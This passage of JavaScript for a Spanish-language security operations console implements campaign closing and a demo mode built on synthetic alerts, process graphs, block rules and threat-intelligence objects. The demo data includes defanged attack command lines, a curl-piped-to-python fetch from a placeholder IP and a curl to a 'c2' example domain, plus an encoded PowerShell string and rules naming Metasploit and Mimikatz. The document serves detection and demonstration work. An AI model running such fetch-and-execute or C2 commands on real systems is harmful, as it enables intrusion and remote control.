  $('#campana-titulo').textContent = `${c.patron} — ${c.clave}`;

  let endpoints = [];
  try { endpoints = (await api('/api/correlaciones/' + c.id)).endpoints; }
  catch { return; }

  const tb = $('#tabla-evidencia tbody');
  tb.textContent = '';
  for (const e of endpoints) {
    const tr = document.createElement('tr');
    tr.append(
      celdaTexto(corto(e.cn_agente), 'mono'),
      celdaTexto(String(e.alertas)),
      celdaTexto(new Date(e.primera_en).toLocaleString('es-ES', { hour12: false })),
      celdaTexto(new Date(e.ultima_en).toLocaleString('es-ES', { hour12: false })),
    );
    tb.appendChild(tr);
  }
}

async function cerrarCampana(veredicto) {
  if (!app.campana) return;
  try {
    await api('/api/correlaciones/' + app.campana + '/cerrar', {
      method: 'POST',
      body: JSON.stringify({ veredicto }),
    });
  } catch (e) {
    registrarActividad('campana', 'no se pudo cerrar: ' + e.message);
    return;
  }
  registrarActividad('campana', `campaña cerrada como ${veredicto}`);
  app.campana = null;
  $('#campana-detalle').hidden = true;
  cargarCampanas();
}

$('#btn-confirmar').addEventListener('click', () => cerrarCampana('confirmada'));
$('#btn-descartar').addEventListener('click', () => cerrarCampana('falso_positivo'));

// ── Modo demostración ─────────────────────────────────────────────────────
//
// Datos sinteticos con la MISMA forma que devuelve el servidor, para poder abrir
// la consola y recorrerla entera sin levantar el plano de control. No toca la
// red: `api()` se desvia aqui en cuanto `app.demo` esta puesto. Las acciones
// (aislar, publicar regla, cerrar campana) mutan este estado en memoria, asi que
// la interfaz responde como lo haria de verdad.

let demoTimer = null;

$('#btn-demo').addEventListener('click', () => {
  app.demo = true;
  app.token = 'demo';
  app.usuario = 'demo@aegiscore';
  const cinta = $('#demo-cinta'); if (cinta) cinta.hidden = false;
  entrar();
});

const AHORA = Date.now();
const hace = (min) => new Date(AHORA - min * 60000).toISOString();

const DEMO_FLOTA = [
  ['web-prod-01',  true,  false, 0, 41200, 2,   1420, 38110],
  ['web-prod-02',  true,  false, 0, 39800, 3,   1418, 37650],
  ['api-gw-03',    true,  false, 0, 52300, 1,   1402, 40120],
  ['db-prod-01',   true,  false, 2, 88700, 6,   1399, 51230],
  ['kube-node-07', true,  false, 0, 63100, 4,   1388, 44100],
  ['kube-node-08', true,  true,  1, 60050, 9,   1377, 43980],
  ['dc-primary',   true,  false, 4, 102400,12,  1360, 60900],
  ['ws-ana',       true,  false, 0, 28800, 0,   1210, 22040],
  ['ws-beto',      true,  false, 0, 27600, 1,   1208, 21870],
  ['ws-carla',     false, false, 0, 26100, 44,  980,  19500],
  ['bastion-01',   true,  false, 0, 33400, 0,   1440, 30110],
  ['ci-runner-04', true,  false, 0, 47700, 5,   1401, 41220],
  ['nas-backup',   false, false, 0, 15900, 190, 610,  9010],
  ['ws-dani',      true,  true,  3, 29500, 22,  1150, 20400],
].map(([host, en_linea, aislado, amenazas, rss, sinContacto, latidos, eventos]) => ({
  cn: `CN=${host},O=Acme,C=ES`, hostname: host, en_linea, aislado,
  amenazas_activas: amenazas, rss_kb: rss,
  ultimo_latido: en_linea ? hace(Math.random() * 2) : hace(sinContacto),
  version_agente: '2.14.0', latidos, eventos, version_politica: 42,
}));

const DEMO_ALERTAS = [
  [4, 'dc-primary', 'kerberos', 'T1558.001', 'Golden Ticket: TGS sin TGT previo durante 12 h', 3],
  [4, 'db-prod-01', 'exfiltracion', 'T1048', 'Volumen saliente anomalo a IP no catalogada', 12],
  [3, 'ws-dani', 'ejecucion', 'T1059.001', 'PowerShell con orden codificada en base64', 26],
  [3, 'kube-node-08', 'evasion', 'T1055', 'Inyeccion reflectiva en proceso de sistema', 41],
  [2, 'web-prod-01', 'persistencia', 'T1053.003', 'cron anadido fuera de ventana de despliegue', 88],
  [2, 'dc-primary', 'descubrimiento', 'T1087.002', 'Enumeracion masiva de cuentas del dominio', 120],
  [1, 'ci-runner-04', 'acceso-credenciales', 'T1552.001', 'Clave privada leida fuera del pipeline', 200],
  [3, 'ws-carla', 'c2', 'T1071.001', 'Baliza HTTPS periodica con jitter bajo', 240],
].map(([severidad, host, categoria, tecnica, descripcion, min], i) => ({
  id: 'al-' + i, cn_agente: `CN=${host},O=Acme,C=ES`, severidad,
  categoria, tecnica_mitre: tecnica, tactica_mitre: '', descripcion, recibido_en: hace(min),
}));

// Los indicadores maliciosos de la demostracion van DESACTIVADOS (hxxp://,
// dominio[.]tld), como se muestran en un SOC: ni se pueden pulsar por error ni
// parecen un recurso que la consola cargue (tests/panel.rs lo vigila).
const DEMO_GRAFO_NODOS = [
  { clave: 1, padre: 0, creador: 0, profundidad: 0, imagen: '/usr/lib/systemd/systemd', cmdline: 'systemd --user', pid: 1, taints: 0, puntuacion: 0, terminado_ns: 0 },
  { clave: 2, padre: 1, creador: 1, profundidad: 1, imagen: '/usr/bin/soffice.bin', cmdline: 'soffice.bin --calc /tmp/factura.xlsx', pid: 3120, taints: 0, puntuacion: 10, terminado_ns: 0 },
  { clave: 3, padre: 2, creador: 2, profundidad: 2, imagen: '/bin/sh', cmdline: 'sh -c "curl -s hxxp://185[.]x/x | python3 -"', pid: 3140, taints: 3, puntuacion: 55, terminado_ns: 0 },
  { clave: 4, padre: 3, creador: 3, profundidad: 3, imagen: '/usr/bin/python3', cmdline: 'python3 -', pid: 3141, taints: 3, puntuacion: 82, terminado_ns: 0 },
  { clave: 5, padre: 4, creador: 4, profundidad: 4, imagen: '/usr/bin/curl', cmdline: 'curl -s hxxps://c2[.]example/task', pid: 3155, taints: 1, puntuacion: 40, terminado_ns: 0 },
];

const DEMO_REGLAS = [
  { id: 1, activa: true, nombre: 'bloquear-metasploit-4444', tipo: 'bloquear_puerto', parametros: { puerto: 4444 }, severidad: 3, creada_por: 'ana@acme' },
  { id: 2, activa: true, nombre: 'aislar-alta-puntuacion', tipo: 'aislar_por_puntuacion', parametros: { umbral: 700 }, severidad: 4, creada_por: 'lead-soc@acme' },
  { id: 3, activa: false, nombre: 'bloquear-mimikatz-hash', tipo: 'bloquear_hash', parametros: { sha256: '9f2c...a1' }, severidad: 4, creada_por: 'beto@acme' },
  { id: 4, activa: true, nombre: 'bloquear-c2-rango', tipo: 'bloquear_red', parametros: { cidr: '185.0.0.0/8' }, severidad: 3, creada_por: 'ana@acme' },
];

const DEMO_STIX = [
  { avistamientos: 37, tipo: 'indicator', id: 'indicator--a1b2c3d4-0001', contenido: { pattern: "[network-traffic:dst_ref.value = '185.220.101.4']" }, ultima_vez: hace(8) },
  { avistamientos: 21, tipo: 'malware', id: 'malware--f5e6d7c8-0002', contenido: { name: 'Cobalt Strike beacon' }, ultima_vez: hace(30) },
  { avistamientos: 14, tipo: 'process', id: 'process--0011a2b3-0003', contenido: { command_line: 'powershell -enc SQBFAFgA...' }, ultima_vez: hace(52) },
  { avistamientos: 6, tipo: 'indicator', id: 'indicator--c9d8e7f6-0004', contenido: { pattern: "[file:hashes.'SHA-256' = '9f2c...a1']" }, ultima_vez: hace(140) },
  { avistamientos: 2, tipo: 'indicator', id: 'indicator--12ab34cd-0005', contenido: { pattern: "[domain-name:value = 'c2.example']" }, ultima_vez: hace(300) },
];

const DEMO_CACERIAS = [
  { id: 'cz-1', lanzada_en: hace(5), consulta: 'SELECT pid, path, sha256 FROM processes WHERE network.port = 4444', lanzada_por: 'ana@acme', objetivo: 14 },
  { id: 'cz-2', lanzada_en: hace(60), consulta: 'SELECT path FROM memory_regions WHERE entropy > 7.0 AND rwx = true', lanzada_por: 'lead-soc@acme', objetivo: 14 },
  { id: 'cz-3', lanzada_en: hace(180), consulta: 'SELECT user, path FROM processes WHERE path LIKE "/tmp/%"', lanzada_por: 'beto@acme', objetivo: 12 },
];

const DEMO_CAZA_DETALLE = {
  'cz-1': {
    caza: { consulta: DEMO_CACERIAS[0].consulta, objetivo: 14, columnas: ['pid', 'path', 'sha256'] },
    resumen: { respondieron: 13, con_hallazgos: 2, coincidencias: 3, inaccesibles: 1, agotados: 0 },
    respuestas: [
      { cn_agente: 'CN=db-prod-01,O=Acme,C=ES', filas: [['3141', '/usr/bin/python3', '9f2c...a1'], ['4022', '/tmp/.x/svc', 'aa10...3f']] },
      { cn_agente: 'CN=ws-dani,O=Acme,C=ES', filas: [['5560', '/tmp/beacon', 'bb20...7c']] },
    ],
  },
};

const DEMO_ESQUEMA = {
  tablas: [
    { nombre: 'processes', descripcion: 'Procesos vivos, con su linaje y hashes.', columnas: [
      { nombre: 'pid', tipo: 'int', coste: 'barato', descripcion: 'identificador de proceso' },
      { nombre: 'path', tipo: 'text', coste: 'barato', descripcion: 'ruta del ejecutable' },
      { nombre: 'sha256', tipo: 'text', coste: 'caro', descripcion: 'hash del binario (lo calcula el endpoint)' },
      { nombre: 'network.port', tipo: 'int', coste: 'medio', descripcion: 'puerto de una conexion asociada' },
    ]},
    { nombre: 'memory_regions', descripcion: 'Regiones de memoria por proceso.', columnas: [
      { nombre: 'entropy', tipo: 'float', coste: 'caro', descripcion: 'entropia normalizada de la region' },
      { nombre: 'rwx', tipo: 'bool', coste: 'barato', descripcion: 'region escribible y ejecutable a la vez' },
    ]},
  ],
};

const DEMO_CAMPANAS = [
  { id: 'co-1', patron: 'enumeracion de dominio', clave: 'cuenta:svc-backup', endpoints: 12, alertas: 41, tecnica_mitre: 'T1087.002', primera_en: hace(180), severidad: 4 },
  { id: 'co-2', patron: 'baliza C2 compartida', clave: 'ip:185.220.101.4', endpoints: 5, alertas: 18, tecnica_mitre: 'T1071.001', primera_en: hace(90), severidad: 3 },
];
const DEMO_CAMPANA_ENDPOINTS = {
  'co-1': [
    { cn_agente: 'CN=dc-primary,O=Acme,C=ES', alertas: 20, primera_en: hace(180), ultima_en: hace(4) },
    { cn_agente: 'CN=db-prod-01,O=Acme,C=ES', alertas: 12, primera_en: hace(150), ultima_en: hace(9) },
    { cn_agente: 'CN=ws-dani,O=Acme,C=ES', alertas: 9, primera_en: hace(120), ultima_en: hace(30) },
  ],
  'co-2': [
    { cn_agente: 'CN=ws-carla,O=Acme,C=ES', alertas: 10, primera_en: hace(90), ultima_en: hace(6) },
    { cn_agente: 'CN=kube-node-08,O=Acme,C=ES', alertas: 8, primera_en: hace(70), ultima_en: hace(15) },
  ],
};

/** Responde una peticion como lo haria el servidor, con datos sinteticos. */
function datosDemo(ruta, opciones = {}) {
  const u = new URL(ruta, location.origin);
  const p = u.pathname;
  const metodo = (opciones.method || 'GET').toUpperCase();
  let m;

  if (metodo === 'POST' && p === '/api/sesion') return { token: 'demo' };
  if (metodo !== 'GET') {
    if ((m = p.match(/^\/api\/agentes\/(.+)\/(aislar|liberar)$/))) {
      const a = DEMO_FLOTA.find((x) => x.cn === decodeURIComponent(m[1]));
      if (a) a.aislado = m[2] === 'aislar';
      return null;
    }
    if ((m = p.match(/^\/api\/reglas\/(\d+)\/activa$/))) {
      const r = DEMO_REGLAS.find((x) => String(x.id) === m[1]);
      if (r) r.activa = JSON.parse(opciones.body || '{}').activa;
      return { version_politica: 43 };
    }
    if ((m = p.match(/^\/api\/reglas\/(\d+)$/))) {
      const i = DEMO_REGLAS.findIndex((x) => String(x.id) === m[1]);
      if (i >= 0) DEMO_REGLAS.splice(i, 1);
      return { version_politica: 43 };
    }
    if (p === '/api/reglas') return { regla: 'demo', version_politica: 43 };
    if ((m = p.match(/^\/api\/correlaciones\/(.+)\/cerrar$/))) {
      const i = DEMO_CAMPANAS.findIndex((x) => x.id === m[1]);
      if (i >= 0) DEMO_CAMPANAS.splice(i, 1);
      return null;
    }
    if (p === '/api/cacerias') return { id: 'cz-1', coste: 'medio' };
    return {};
  }

  if (p === '/api/resumen') return {
    agentes_total: DEMO_FLOTA.length,
    agentes_en_linea: DEMO_FLOTA.filter((a) => a.en_linea).length,
    agentes_aislados: DEMO_FLOTA.filter((a) => a.aislado).length,
    alertas_abiertas: DEMO_ALERTAS.length,
    alertas_criticas: DEMO_ALERTAS.filter((a) => a.severidad >= 4).length,
    version_politica: 42,
  };
  if (p === '/api/agentes') return DEMO_FLOTA;
  if ((m = p.match(/^\/api\/agentes\/(.+)$/))) return DEMO_FLOTA.find((a) => a.cn === decodeURIComponent(m[1])) || DEMO_FLOTA[0];
  if (p === '/api/alertas') {
    const abiertas = u.searchParams.get('abiertas') !== 'false';
    return abiertas ? DEMO_ALERTAS : DEMO_ALERTAS.slice(0, 4);
  }
  if (p === '/api/grafos') return [{ id: 'g-1', recibido_en: hace(12), cn_agente: 'CN=db-prod-01,O=Acme,C=ES', nodos: DEMO_GRAFO_NODOS.length }];
  if (p.startsWith('/api/grafos/')) return { nodos: DEMO_GRAFO_NODOS };
  if (p === '/api/reglas') return DEMO_REGLAS;
  if (p === '/api/stix/objetos') return DEMO_STIX;
  if (p === '/api/cacerias') return DEMO_CACERIAS;
  if ((m = p.match(/^\/api\/cacerias\/(.+)$/))) return DEMO_CAZA_DETALLE[m[1]] || DEMO_CAZA_DETALLE['cz-1'];
  if (p === '/api/aegisql/esquema') return DEMO_ESQUEMA;
  if (p === '/api/correlaciones') return { correlaciones: DEMO_CAMPANAS };
  if ((m = p.match(/^\/api\/correlaciones\/(.+)$/))) return { endpoints: DEMO_CAMPANA_ENDPOINTS[m[1]] || [] };
  return {};
}

/** Simula el goteo de sucesos que llegaria por el WebSocket. */
function simularActividadDemo() {
  registrarActividad('enrolado', 'ci-runner-04 completo el enrolamiento mTLS');
  registrarActividad('politica', 'politica v42 publicada a 14 endpoints');
  registrarActividad('alerta', 'db-prod-01 · exfiltracion (T1048)');
  const sucesos = [
    ['alerta', 'dc-primary · enumeracion de cuentas del dominio', true],
    ['aislamiento', 'ws-dani aislado por puntuacion >= 700', false],
    ['caza', 'cz-1 · 2 endpoints con hallazgos', false],
    ['alerta', 'kube-node-08 · inyeccion reflectiva (T1055)', true],
    ['enrolado', 'bastion-01 renovo su certificado', false],
    ['campana', 'campana C2 compartida gano un endpoint', false],
  ];
  let i = 0;
  demoTimer = setInterval(() => {
    if (!app.demo) { clearInterval(demoTimer); demoTimer = null; return; }
    const [tipo, texto, subePin] = sucesos[i % sucesos.length];
    registrarActividad(tipo, texto);
    if (subePin) subirPin();
    i++;
  }, 4500);
}
